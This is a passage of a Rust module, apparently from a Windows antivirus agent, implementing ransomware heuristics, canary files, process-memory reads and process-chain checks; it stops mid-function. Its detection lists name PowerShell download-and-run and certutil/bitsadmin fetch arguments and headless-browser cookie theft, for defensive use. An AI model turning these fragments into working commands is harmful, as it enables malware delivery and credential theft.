//! Real-time protection building blocks (user mode, no driver):
//! file change notifications, process start polling with parent/child and
//! command-line heuristics, ransomware heuristics (canary files, write
//! bursts with high entropy), network/DNS matching, removable drives and
//! process suspend/resume/terminate helpers.
//!
//! Nothing here acts on its own: findings go through the normal pipeline and
//! wait for the user's decision. The only automatic measure is the optional
//! "suspend" of ransomware suspects (off by default, never kill).

use std::collections::{HashMap, HashSet, VecDeque};
use std::ffi::c_void;
use std::net::Ipv4Addr;
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::sync::mpsc::Sender;
use std::time::{Duration, Instant};

use windows::core::{PCWSTR, PCSTR};
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::NetworkManagement::IpHelper::{GetExtendedTcpTable, MIB_TCPTABLE_OWNER_PID, TCP_TABLE_OWNER_PID_ALL};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, GetDriveTypeW, GetLogicalDrives, ReadDirectoryChangesW, FILE_FLAG_BACKUP_SEMANTICS, FILE_LIST_DIRECTORY,
    FILE_NOTIFY_CHANGE_FILE_NAME, FILE_NOTIFY_CHANGE_LAST_WRITE, FILE_NOTIFY_CHANGE_SIZE, FILE_SHARE_DELETE,
    FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress, LoadLibraryW};
use windows::Win32::System::Threading::{
    OpenProcess, TerminateProcess, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_SUSPEND_RESUME, PROCESS_TERMINATE,
    PROCESS_VM_READ,
};

use crate::model::{Finding, Kind, Severity};

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// =================================================================== files

/// Kind of change reported by the file watcher.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Change {
    Added,
    Removed,
    Modified,
    RenamedFrom,
    RenamedTo,
}

#[derive(Debug, Clone)]
pub struct FileEvent {
    pub path: PathBuf,
    pub change: Change,
}

/// Watches `dir` recursively and sends events until the channel is closed.
/// Blocks the calling thread (run it on its own thread).
pub fn watch_directory(dir: &Path, tx: Sender<FileEvent>) -> anyhow::Result<()> {
    let w: Vec<u16> = dir.as_os_str().encode_wide().chain(std::iter::once(0)).collect();
    // SAFETY: valid NUL-terminated path; handle closed at the end.
    let handle = unsafe {
        CreateFileW(
            PCWSTR(w.as_ptr()),
            FILE_LIST_DIRECTORY.0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS,
            None,
        )?
    };
    let mut buf = vec![0u32; 16 * 1024]; // 64 KB, DWORD-aligned
    let result = loop {
        let mut returned = 0u32;
        // SAFETY: buffer is DWORD-aligned and large enough; synchronous call.
        let r = unsafe {
            ReadDirectoryChangesW(
                handle,
                buf.as_mut_ptr() as *mut c_void,
                (buf.len() * 4) as u32,
                true,
                FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE | FILE_NOTIFY_CHANGE_SIZE,
                Some(&mut returned),
                None,
                None,
            )
        };
        if let Err(e) = r {
            break Err(anyhow::anyhow!("Ordnerüberwachung {} beendet: {e}", dir.display()));
        }
        if returned == 0 {
            continue; // buffer overflow: events lost, keep watching
        }
        let bytes = unsafe { std::slice::from_raw_parts(buf.as_ptr() as *const u8, returned as usize) };
        let mut off = 0usize;
        let mut closed = false;
        loop {
            if off + 12 > bytes.len() {
                break;
            }
            let next = u32::from_le_bytes(bytes[off..off + 4].try_into().unwrap()) as usize;
            let action = u32::from_le_bytes(bytes[off + 4..off + 8].try_into().unwrap());
            let len = u32::from_le_bytes(bytes[off + 8..off + 12].try_into().unwrap()) as usize;
            let name_bytes = &bytes[off + 12..(off + 12 + len).min(bytes.len())];
            let name: Vec<u16> = name_bytes.as_chunks::<2>().0.iter().map(|c| u16::from_le_bytes(*c)).collect();
            let change = match action {
                1 => Change::Added,
                2 => Change::Removed,
                3 => Change::Modified,
                4 => Change::RenamedFrom,
                _ => Change::RenamedTo,
            };
            let path = dir.join(String::from_utf16_lossy(&name));
            if tx.send(FileEvent { path, change }).is_err() {
                closed = true;
                break;
            }
            if next == 0 {
                break;
            }
            off += next;
        }
        if closed {
            break Ok(());
        }
    };
    // SAFETY: handle opened above.
    unsafe {
        let _ = CloseHandle(handle);
    }
    result
}

/// Waits until a file has not changed for `quiet` before it is scanned
/// (downloads and copies are written in many steps).
#[derive(Default)]
pub struct Debouncer {
    pending: HashMap<PathBuf, Instant>,
}

impl Debouncer {
    pub fn touch(&mut self, path: PathBuf, now: Instant) {
        self.pending.insert(path, now);
    }
    pub fn forget(&mut self, path: &Path) {
        self.pending.remove(path);
    }
    /// Paths that were quiet for `quiet`; they are removed from the set.
    pub fn ready(&mut self, now: Instant, quiet: Duration) -> Vec<PathBuf> {
        let ready: Vec<PathBuf> = self.pending.iter().filter(|(_, t)| now.duration_since(**t) >= quiet).map(|(p, _)| p.clone()).collect();
        for p in &ready {
            self.pending.remove(p);
        }
        ready
    }
    pub fn len(&self) -> usize {
        self.pending.len()
    }
    pub fn is_empty(&self) -> bool {
        self.pending.is_empty()
    }
}

/// Folders watched by default (existing ones only).
pub fn default_watch_dirs() -> Vec<PathBuf> {
    let mut v = Vec::new();
    if let Ok(p) = std::env::var("USERPROFILE") {
        for sub in ["Downloads", "Desktop", "Documents"] {
            v.push(PathBuf::from(&p).join(sub));
        }
    }
    if let Ok(t) = std::env::var("TEMP") {
        v.push(PathBuf::from(t));
    }
    if let Ok(a) = std::env::var("APPDATA") {
        v.push(PathBuf::from(a).join("Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
    }
    v.into_iter().filter(|p| p.is_dir()).collect()
}

// ============================================================== ransomware

/// Shannon entropy in bits per byte (0..8). Encrypted data is close to 8.
pub fn entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0u32; 256];
    for b in data {
        counts[*b as usize] += 1;
    }
    let n = data.len() as f64;
    counts.iter().filter(|c| **c > 0).map(|c| {
        let p = *c as f64 / n;
        -p * p.log2()
    }).sum()
}

/// Entropy of the first 64 KB of a file.
pub fn file_entropy(path: &Path) -> Option<f64> {
    use std::io::Read;
    let mut f = std::fs::File::open(path).ok()?;
    let mut buf = vec![0u8; 64 * 1024];
    let n = f.read(&mut buf).ok()?;
    (n >= 512).then(|| entropy(&buf[..n]))
}

/// File types that are compressed/encrypted by nature (high entropy is normal).
pub fn naturally_high_entropy(path: &Path) -> bool {
    if is_git_data(path) || is_browser_cache(path) {
        return true;
    }
    let ext = path.extension().map(|e| e.to_string_lossy().to_ascii_lowercase()).unwrap_or_default();
    matches!(
        ext.as_str(),
        "zip" | "7z" | "rar" | "gz" | "xz" | "bz2" | "zst" | "jpg" | "jpeg" | "png" | "gif" | "webp" | "mp3" | "mp4" | "mkv"
            | "avi" | "mov" | "m4a" | "flac" | "ogg" | "pdf" | "docx" | "xlsx" | "pptx" | "msi" | "cab" | "exe" | "dll"
            | "crdownload" | "part" | "tmp" | "iso" | "pak" | "vpk" | "bin" | "woff" | "woff2" | "crx" | "br"
    )
}

/// Browser data that is compressed by nature: HTTP cache, code/GPU/shader caches, downloaded
/// components and the variations seed. Every browser start with a fresh profile (automation,
/// other programs) writes dozens of them at once – that is not encryption of the user's files.
pub fn is_browser_cache(path: &Path) -> bool {
    const DIRS: &[&str] = &[
        "cache_data", "code cache", "gpucache", "grshadercache", "graphitedawncache", "dawncache", "dawngraphitecache",
        "dawnwebgpucache", "shadercache", "component_crx_cache", "extensions_crx_cache", "cachestorage", "cache2",
    ];
    // Edge downloads components into msedge_url_fetcher_*, Chromium unpacks into scoped_dir*.
    let in_cache_dir = path.parent().is_some_and(|d| {
        d.components().any(|c| {
            let c = c.as_os_str().to_string_lossy().to_ascii_lowercase();
            DIRS.contains(&c.as_str()) || c.starts_with("msedge_url_fetcher_") || c.starts_with("scoped_dir")
        })
    });
    let name = path.file_name().map(|n| n.to_string_lossy().to_ascii_lowercase()).unwrap_or_default();
    // Edge keeps its session and tab state encrypted (`Sessions_Encrypted\Session_<n>`,
    // `Tabs_<n>`); a headless Edge started by a program writes them at once (#528, 23.11.2026).
    let in_session_dir = path.parent().and_then(|d| d.file_name()).is_some_and(|d| d.eq_ignore_ascii_case("sessions_encrypted"));
    let session_file = in_session_dir && (name.starts_with("session_") || name.starts_with("tabs_"));
    in_cache_dir || session_file || name.starts_with("variationsseed")
}

/// Git writes compressed data by the hundred (every commit, diff, checkout). Decided by the
/// content only – never by the path, so encrypted output under an "objects" folder still counts:
/// a loose object is a zlib stream that inflates to "blob|tree|commit|tag <size>\0"; a pack
/// starts with "PACK" + version 2/3, a pack index with "\xfftOc" + version 2.
pub fn is_git_data(path: &Path) -> bool {
    use std::io::Read;
    let mut head = [0u8; 512];
    let Ok(n) = std::fs::File::open(path).and_then(|mut f| f.read(&mut head)) else { return false };
    git_content(&head[..n])
}

fn git_content(head: &[u8]) -> bool {
    use std::io::Read;
    let be32 = |b: &[u8]| u32::from_be_bytes([b[0], b[1], b[2], b[3]]);
    if head.len() >= 8 && &head[..4] == b"PACK" && matches!(be32(&head[4..8]), 2 | 3) {
        return true;
    }
    if head.len() >= 8 && head[..4] == [0xff, b't', b'O', b'c'] && be32(&head[4..8]) == 2 {
        return true;
    }
    // zlib header: deflate (CM 8) and a valid check value
    if head.len() < 2 || head[0] & 0x0f != 8 || ((u16::from(head[0]) << 8) | u16::from(head[1])) % 31 != 0 {
        return false;
    }
    let mut out = [0u8; 32];
    let mut z = flate2::read::ZlibDecoder::new(head);
    let mut got = 0;
    while got < out.len() {
        match z.read(&mut out[got..]) {
            Ok(0) | Err(_) => break,
            Ok(k) => got += k,
        }
    }
    let text = &out[..got];
    let Some(space) = text.iter().position(|b| *b == b' ') else { return false };
    let (kind, rest) = (&text[..space], &text[space + 1..]);
    let Some(nul) = rest.iter().position(|b| *b == 0) else { return false };
    matches!(kind, b"blob" | b"tree" | b"commit" | b"tag") && nul > 0 && rest[..nul].iter().all(u8::is_ascii_digit)
}

/// So many documents with encrypted content within 20 seconds raise the ransomware alarm.
/// 12 instead of the former 25: with the alarm (and the freeze, if switched on) every file counts.
pub const RANSOMWARE_BURST: usize = 12;
/// With a new unsigned program running (from the internet, new in a user's folder, from a
/// removable drive) this many files that look encrypted are enough to freeze that program.
/// BlackBasta encrypts in the first second after its start: with the general threshold 32 of
/// 160 documents were lost in four of five test runs (20./21.11.2026), once 125.
pub const RANSOMWARE_FRESH: usize = 2;

/// Was the file written just now? A change notice also comes when a program only reads or
/// re-labels an old file (indexing, a virus scan): files encrypted minutes ago must not raise a
/// new alarm – that happened in the test of 19.11.2026 and hid the next real attack.
pub fn written_recently(path: &Path, within: Duration) -> bool {
    std::fs::metadata(path).and_then(|m| m.modified()).ok().and_then(|t| t.elapsed().ok()).is_some_and(|age| age <= within)
}

/// Did the file exist before this moment (created at least `min_age` ago)? Ransomware changes
/// files that were there; unpacking an archive, a download or an export creates new ones. An
/// overwrite in place and a rename keep the creation time of the file.
pub fn existed_before(path: &Path, min_age: Duration) -> bool {
    std::fs::metadata(path).and_then(|m| m.created()).ok().and_then(|t| t.elapsed().ok()).is_some_and(|age| age >= min_age)
}

/// Deletions in the watched folders during the last 20 seconds. Some ransomware writes an
/// encrypted copy and deletes the original instead of overwriting it: new files that look
/// encrypted count only together with such deletions.
#[derive(Default)]
pub struct Deletions(VecDeque<Instant>);

impl Deletions {
    pub fn note(&mut self, now: Instant) {
        self.0.push_back(now);
        if self.0.len() > 2000 {
            self.0.pop_front();
        }
    }

    pub fn recent(&mut self, now: Instant) -> usize {
        while self.0.front().is_some_and(|t| now.duration_since(*t) > Duration::from_secs(20)) {
            self.0.pop_front();
        }
        self.0.len()
    }
}

/// Deleted files within 20 seconds from which new encrypted-looking files count as well.
pub const DELETIONS_FOR_NEW_FILES: usize = 5;

/// One more file for the ransomware count? Written just now, content looks encrypted, not a
/// naturally packed format – and an existing file (changed in place or renamed), or a new one
/// while originals are being deleted. `deletions`: see `Deletions::recent`.
pub fn looks_encrypted_by_ransomware(path: &Path, deletions: usize) -> bool {
    !naturally_high_entropy(path)
        && written_recently(path, Duration::from_secs(15))
        && (existed_before(path, Duration::from_secs(8)) || deletions >= DELETIONS_FOR_NEW_FILES)
        && file_entropy(path).is_some_and(|e| e > 7.5)
}

/// Detects many changes of non-compressed files that became high-entropy
/// within a short window – typical for encryption by ransomware.
pub struct BurstDetector {
    window: Duration,
    threshold: usize,
    events: VecDeque<(Instant, PathBuf)>,
    last_alarm: Option<Instant>,
}

impl BurstDetector {
    pub fn new(window: Duration, threshold: usize) -> Self {
        Self { window, threshold, events: VecDeque::new(), last_alarm: None }
    }

    /// Records a suspicious write (high entropy content). Returns the affected paths each time
    /// the threshold is reached, and whether this is a NEW alarm (true at most once per window)
    /// or the same attack going on (false: freeze what is new, but no second message). The
    /// count starts again after each return, so an attack that continues is seen again after
    /// the next `threshold` files – a program started a moment later is still caught.
    pub fn record(&mut self, path: PathBuf, now: Instant) -> Option<(Vec<PathBuf>, bool)> {
        self.events.push_back((now, path));
        while self.events.front().is_some_and(|(t, _)| now.duration_since(*t) > self.window) {
            self.events.pop_front();
        }
        let distinct: HashSet<&PathBuf> = self.events.iter().map(|(_, p)| p).collect();
        if distinct.len() < self.threshold {
            return None;
        }
        let files: Vec<PathBuf> = distinct.into_iter().cloned().collect();
        self.events.clear();
        let new = self.last_alarm.is_none_or(|t| now.duration_since(t) > self.window);
        if new {
            self.last_alarm = Some(now);
        }
        Some((files, new))
    }
}

const CANARY_NAME: &str = "~vs-koeder-nicht-loeschen.docx";
/// A second canary that sorts to the very front of its folder ("!" comes before letters and
/// digits, "~" after them): ransomware that works through a folder from the start meets it
/// before the first real document.
const CANARY_FIRST: &str = "!vs-koeder-nicht-loeschen.docx";

/// Content of a canary file (plain, low entropy).
fn canary_content() -> Vec<u8> {
    "Virenscanner-Koederdatei. Diese Datei bitte nicht loeschen oder aendern.\r\n"
        .repeat(64)
        .into_bytes()
}

/// Creates hidden canary files in the given folders. Returns their paths.
pub fn ensure_canaries(dirs: &[PathBuf]) -> Vec<PathBuf> {
    use windows::Win32::Storage::FileSystem::{SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN};
    let mut out = Vec::new();
    for p in dirs.iter().flat_map(|d| [d.join(CANARY_FIRST), d.join(CANARY_NAME)]) {
        if std::fs::read(&p).ok().as_deref() != Some(&canary_content()[..]) && std::fs::write(&p, canary_content()).is_err() {
            continue;
        }
        let w: Vec<u16> = p.as_os_str().encode_wide().chain(std::iter::once(0)).collect();
        // SAFETY: valid path.
        unsafe {
            let _ = SetFileAttributesW(PCWSTR(w.as_ptr()), FILE_ATTRIBUTE_HIDDEN);
        }
        out.push(p);
    }
    out
}

pub fn is_canary(path: &Path) -> bool {
    path.file_name().is_some_and(|n| n.eq_ignore_ascii_case(CANARY_NAME) || n.eq_ignore_ascii_case(CANARY_FIRST))
}

/// One look at a canary, without waiting: Some(true) changed, renamed away or deleted,
/// Some(false) untouched, None: it cannot be read right now (someone holds it open).
///
/// The file watch must never wait for a canary: on 22.11.2026 BlackBasta hit the canary first,
/// the watch waited up to a second for the locked file and checked nothing else meanwhile –
/// 117 to 129 of 160 documents were lost instead of 32.
pub fn canary_look(path: &Path) -> Option<bool> {
    match std::fs::read(path) {
        Ok(content) => Some(content != canary_content()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Some(true),
        Err(_) => None,
    }
}

/// True if the canary at `path` was changed, renamed away or deleted.
/// Only a missing file or changed content counts. A file that is briefly locked
/// by another reader (backup, virus scanner, indexer) is not an alarm.
pub fn canary_tampered(path: &Path) -> bool {
    for _ in 0..5 {
        match std::fs::read(path) {
            Ok(content) => return content != canary_content(),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return true,
            Err(_) => std::thread::sleep(Duration::from_millis(200)),
        }
    }
    tracing::debug!("Köderdatei {} gerade gesperrt – kein Alarm", path.display());
    false
}

// =============================================================== processes

#[derive(Debug, Clone, PartialEq)]
pub struct ProcInfo {
    pub pid: u32,
    pub ppid: u32,
    pub name: String,
    pub path: Option<PathBuf>,
}

/// Only the IDs of the running processes – a single cheap call. The full snapshot below costs
/// about 12 ms of processor time with 390 processes (measured 22.11.2026: polled 16 times a
/// second it kept the agent at 20 % of one core).
pub fn process_ids() -> Vec<u32> {
    use windows::Win32::System::ProcessStatus::EnumProcesses;
    let mut ids = vec![0u32; 4096];
    loop {
        let mut bytes = 0u32;
        // SAFETY: the buffer is as large as stated; `bytes` receives what was written.
        if unsafe { EnumProcesses(ids.as_mut_ptr(), (ids.len() * 4) as u32, &mut bytes) }.is_err() {
            return Vec::new();
        }
        let n = bytes as usize / 4;
        if n < ids.len() || ids.len() >= 65_536 {
            ids.truncate(n);
            return ids;
        }
        ids = vec![0u32; ids.len() * 4]; // buffer was full: there may be more
    }
}

/// Snapshot of running processes with parent pid and image path.
pub fn process_snapshot() -> HashMap<u32, ProcInfo> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    let mut out = HashMap::new();
    // SAFETY: snapshot handle closed below.
    unsafe {
        let Ok(snap) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) else { return out };
        let mut e = PROCESSENTRY32W { dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32, ..Default::default() };
        if Process32FirstW(snap, &mut e).is_ok() {
            loop {
                let len = e.szExeFile.iter().position(|c| *c == 0).unwrap_or(e.szExeFile.len());
                out.insert(
                    e.th32ProcessID,
                    ProcInfo { pid: e.th32ProcessID, ppid: e.th32ParentProcessID, name: String::from_utf16_lossy(&e.szExeFile[..len]), path: None },
                );
                if Process32NextW(snap, &mut e).is_err() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snap);
    }
    out
}

/// Processes that hold this file open right now (asked from the Windows Restart Manager,
/// the same list Windows shows in "The file is open in ..."). Empty when nobody holds it or
/// the question fails.
pub fn file_holders(path: &Path) -> Vec<u32> {
    #[repr(C)]
    struct Info {
        pid: u32,
        start: [u32; 2],
        app: [u16; 256],
        service: [u16; 64],
        kind: i32,
        status: u32,
        session: u32,
        restartable: i32,
    }
    #[link(name = "rstrtmgr")]
    unsafe extern "system" {
        fn RmStartSession(session: *mut u32, flags: u32, key: *mut u16) -> u32;
        fn RmRegisterResources(session: u32, files: u32, names: *const *const u16, apps: u32, app: *const c_void, services: u32, service: *const *const u16) -> u32;
        fn RmGetList(session: u32, needed: *mut u32, count: *mut u32, infos: *mut Info, reasons: *mut u32) -> u32;
        fn RmEndSession(session: u32) -> u32;
    }
    const MORE_DATA: u32 = 234;
    let name: Vec<u16> = path.as_os_str().encode_wide().chain(std::iter::once(0)).collect();
    let mut out = Vec::new();
    // SAFETY: all buffers are as large as stated; the session is closed below.
    unsafe {
        let mut session = 0u32;
        let mut key = [0u16; 40];
        if RmStartSession(&mut session, 0, key.as_mut_ptr()) != 0 {
            return out;
        }
        let names = [name.as_ptr()];
        if RmRegisterResources(session, 1, names.as_ptr(), 0, std::ptr::null(), 0, std::ptr::null()) == 0 {
            let mut size = 16u32;
            for _ in 0..3 {
                let mut infos: Vec<Info> = Vec::with_capacity(size as usize);
                let (mut needed, mut count, mut reasons) = (0u32, size, 0u32);
                let r = RmGetList(session, &mut needed, &mut count, infos.as_mut_ptr(), &mut reasons);
                if r == MORE_DATA {
                    size = needed + 8;
                    continue;
                }
                if r == 0 {
                    infos.set_len((count as usize).min(size as usize));
                    out = infos.iter().map(|i| i.pid).collect();
                }
                break;
            }
        }
        let _ = RmEndSession(session);
    }
    out
}

/// Program and creation time (FILETIME, 100 ns since 1601) of a running process.
pub fn process_path_and_start(pid: u32) -> Option<(PathBuf, i64)> {
    use windows::Win32::Foundation::FILETIME;
    use windows::Win32::System::Threading::GetProcessTimes;
    let path = process_path(pid)?;
    let (mut c, mut e, mut k, mut u) = (FILETIME::default(), FILETIME::default(), FILETIME::default(), FILETIME::default());
    // SAFETY: handle closed below; valid out pointers.
    unsafe {
        let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid).ok()?;
        let r = GetProcessTimes(h, &mut c, &mut e, &mut k, &mut u);
        let _ = CloseHandle(h);
        r.ok()?;
    }
    Some((path, ((u64::from(c.dwHighDateTime) << 32) | u64::from(c.dwLowDateTime)) as i64))
}

pub fn process_path(pid: u32) -> Option<PathBuf> {
    use windows::core::PWSTR;
    use windows::Win32::System::Threading::{QueryFullProcessImageNameW, PROCESS_NAME_WIN32};
    if pid <= 4 {
        return None;
    }
    // SAFETY: handle closed below; buffer length passed correctly.
    unsafe {
        let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid).ok()?;
        let mut buf = [0u16; 1024];
        let mut len = buf.len() as u32;
        let r = QueryFullProcessImageNameW(h, PROCESS_NAME_WIN32, PWSTR(buf.as_mut_ptr()), &mut len);
        let _ = CloseHandle(h);
        r.ok()?;
        Some(PathBuf::from(String::from_utf16_lossy(&buf[..len as usize])))
    }
}

type NtQueryFn = unsafe extern "system" fn(HANDLE, i32, *mut c_void, u32, *mut u32) -> i32;
type NtProcFn = unsafe extern "system" fn(HANDLE) -> i32;

fn ntdll(name: &str) -> Option<unsafe extern "system" fn() -> isize> {
    let lib = wide("ntdll.dll");
    let n = format!("{name}\0");
    // SAFETY: ntdll is always loaded; documented exports.
    unsafe {
        let m = GetModuleHandleW(PCWSTR(lib.as_ptr())).ok()?;
        GetProcAddress(m, PCSTR(n.as_ptr()))
    }
}

/// Command line of a process of the same user (ProcessCommandLineInformation).
pub fn process_command_line(pid: u32) -> Option<String> {
    let f: NtQueryFn = unsafe { std::mem::transmute(ntdll("NtQueryInformationProcess")?) };
    // SAFETY: handle closed below; buffer sized from the first call.
    unsafe {
        let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, false, pid)
            .or_else(|_| OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid))
            .ok()?;
        let mut need = 0u32;
        let _ = f(h, 60, std::ptr::null_mut(), 0, &mut need);
        let mut result = None;
        if need > 16 && need < 65536 {
            let mut buf = vec![0u64; (need as usize).div_ceil(8)];
            if f(h, 60, buf.as_mut_ptr() as *mut c_void, need, &mut need) >= 0 {
                let base = buf.as_ptr() as *const u8;
                let len = *(base as *const u16) as usize / 2;
                let ptr = *(base.add(8) as *const *const u16);
                if !ptr.is_null() && len > 0 {
                    result = Some(String::from_utf16_lossy(std::slice::from_raw_parts(ptr, len)));
                }
            }
        }
        let _ = CloseHandle(h);
        result
    }
}

/// Working folder of a running process (read from its start parameters). None if the process
/// has ended or may not be read.
pub fn process_current_dir(pid: u32) -> Option<PathBuf> {
    use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
    let f: NtQueryFn = unsafe { std::mem::transmute(ntdll("NtQueryInformationProcess")?) };
    // SAFETY: handle closed below; every read is bounds-checked by the kernel and by `read`.
    unsafe {
        let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, false, pid).ok()?;
        let read = |addr: u64, buf: &mut [u8]| -> bool {
            let mut got = 0usize;
            addr != 0 && ReadProcessMemory(h, addr as *const c_void, buf.as_mut_ptr() as *mut c_void, buf.len(), Some(&mut got)).is_ok() && got == buf.len()
        };
        let u64_at = |addr: u64| -> Option<u64> {
            let mut b = [0u8; 8];
            read(addr, &mut b).then(|| u64::from_le_bytes(b))
        };
        let result = (|| {
            // PROCESS_BASIC_INFORMATION (class 0): the address of the PEB is the second field.
            let mut pbi = [0u64; 6];
            let mut need = 0u32;
            if f(h, 0, pbi.as_mut_ptr() as *mut c_void, 48, &mut need) < 0 {
                return None;
            }
            // PEB + 0x20: process parameters; there + 0x38: current directory (length, buffer).
            let params = u64_at(pbi[1] + 0x20)?;
            let mut us = [0u8; 16];
            if !read(params + 0x38, &mut us) {
                return None;
            }
            let len = u16::from_le_bytes([us[0], us[1]]) as usize;
            let ptr = u64::from_le_bytes(us[8..16].try_into().ok()?);
            if len == 0 || len > 1024 || !len.is_multiple_of(2) {
                return None;
            }
            let mut raw = vec![0u8; len];
            if !read(ptr, &mut raw) {
                return None;
            }
            let wide: Vec<u16> = raw.chunks(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
            let s = String::from_utf16_lossy(&wide);
            let s = s.trim_end_matches('\\');
            // "C:" alone would be drive-relative: keep the backslash of a drive root.
            Some(PathBuf::from(if s.len() == 2 { format!("{s}\\") } else { s.to_string() }))
        })();
        let _ = CloseHandle(h);
        result
    }
}

const OFFICE_AND_BROWSERS: [&str; 16] = [
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "msaccess.exe", "onenote.exe", "mspub.exe", "visio.exe",
    "acrord32.exe", "acrobat.exe", "chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe", "thunderbird.exe",
];
const SCRIPT_CHILDREN: [&str; 11] = [
    "powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
    "certutil.exe", "bitsadmin.exe", "msiexec.exe",
];
const BAD_ARGS: [&str; 14] = [
    "-enc ", "-encodedcommand", "-e jab", "frombase64string", "downloadstring", "downloadfile", "invoke-webrequest",
    "iwr ", "invoke-expression", "iex(", "iex (", "-urlcache", "/transfer", "hidden -nop",
];

/// Heuristic verdict for a new process: (rule id, description, severity).
pub fn assess_process(parent: &str, child: &str, cmdline: &str) -> Option<(String, String, Severity)> {
    // Very short processes are named after their command line ("mshta vbscript:…"):
    // without an extension the program is the .exe.
    let exe = |n: &str| {
        let n = n.to_ascii_lowercase();
        if n.is_empty() || n.contains('.') { n } else { format!("{n}.exe") }
    };
    let parent = exe(parent);
    let child = exe(child);
    let cmd = cmdline.to_ascii_lowercase();
    let script_child = SCRIPT_CHILDREN.contains(&child.as_str());
    let bad_arg = BAD_ARGS.iter().find(|a| cmd.contains(*a));
    let net_arg = cmd.contains("http://") || cmd.contains("https://");
    // A browser starting the registered, signed helper of an extension (native messaging).
    let native_host = child == "cmd.exe" && crate::nativehost::verified_launch(&parent, cmdline);
    if script_child && OFFICE_AND_BROWSERS.contains(&parent.as_str()) && child != "msiexec.exe" && !native_host {
        let sev = if bad_arg.is_some() || net_arg { Severity::Kritisch } else { Severity::Hoch };
        return Some((
            format!("PROZESSKETTE:{parent}>{child}"),
            tf!("{parent} startet {child} – typisch für Makro-/Exploit-Angriffe", "{parent} starts {child} – typical for macro/exploit attacks"),
            sev,
        ));
    }
    // Chromium browser remote-controlled by another program (the usual way around Chrome's
    // App-Bound Encryption): headless with the real profile = stealing cookies/passwords.
    const CHROMIUM: [&str; 5] = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe"];
    if CHROMIUM.contains(&child.as_str())
        && !CHROMIUM.contains(&parent.as_str())
        && (cmd.contains("--remote-debugging-port") || cmd.contains("--remote-debugging-pipe"))
    {
        let headless = cmd.contains("--headless");
        let real_profile = match cmd.find("--user-data-dir") {
            None => true, // without the option the browser uses the user's own profile
            Some(i) => cmd[i..].contains("\\user data") || cmd[i..].contains("\\opera software\\"),
        };
        let (sev, text) = if headless && real_profile {
            (Severity::Kritisch, tf!("{parent} steuert {child} unsichtbar mit deinem echten Browserprofil fern – typisch für den Diebstahl von Cookies und Passwörtern", "{parent} remote-controls {child} invisibly with your real browser profile – typical for the theft of cookies and passwords"))
        } else {
            (Severity::Hoch, tf!("{parent} startet {child} mit Fernsteuerung (Remote-Debugging)", "{parent} starts {child} with remote control (remote debugging)"))
        };
        return Some(("BROWSER:FERNSTEUERUNG".into(), text, sev));
    }
    // Extension loaded from a folder at start (ChromeLoader-style adware).
    if CHROMIUM.contains(&child.as_str()) && !CHROMIUM.contains(&parent.as_str()) {
        if let Some(i) = cmd.find("--load-extension=") {
            let value = cmd[i + "--load-extension=".len()..].trim_start_matches('"');
            let first = value.split([',', '"']).next().unwrap_or("").split(" --").next().unwrap_or("").trim();
            if !first.is_empty() && crate::autostart::is_user_writable(Path::new(first)) {
                return Some((
                    "BROWSER:ERWEITERUNG-GELADEN".into(),
                    tf!("{parent} startet {child} mit einer Erweiterung aus einem Benutzerordner (--load-extension) – typisch für Adware", "{parent} starts {child} with an extension from a user folder (--load-extension) – typical for adware"),
                    Severity::Hoch,
                ));
            }
        }
    }
    if let Some(arg) = bad_arg.filter(|_| matches!(child.as_str(), "powershell.exe" | "pwsh.exe" | "mshta.exe" | "certutil.exe" | "bitsadmin.exe")) {
        return Some((
            format!("PROZESSARGUMENTE:{child}"),
            tf!("{child} mit verdächtigen Argumenten ({})", "{child} with suspicious arguments ({})", arg.trim()),
            Severity::Hoch,
        ));
    }
    if matches!(child.as_str(), "powershell.exe" | "pwsh.exe") && encoded_command(&cmd) {
        return Some((
            format!("PROZESSARGUMENTE:{child}"),
            tf!("{child} mit verschlüsseltem Befehl (-EncodedCommand)", "{child} with an encoded command (-EncodedCommand)"),
            Severity::Hoch,
        ));
    }
    // Script code directly in the command line (mshta vbscript:/javascript:, rundll32 …RunHTMLApplication).
    if matches!(child.as_str(), "mshta.exe" | "rundll32.exe")
        && (cmd.contains("vbscript:") || cmd.contains("javascript:") || cmd.contains("runhtmlapplication"))
    {
        return Some((
            format!("PROZESSARGUMENTE:{child}"),
            tf!("{child} führt Skriptcode direkt aus der Befehlszeile aus", "{child} runs script code directly from the command line"),
            Severity::Hoch,
        ));
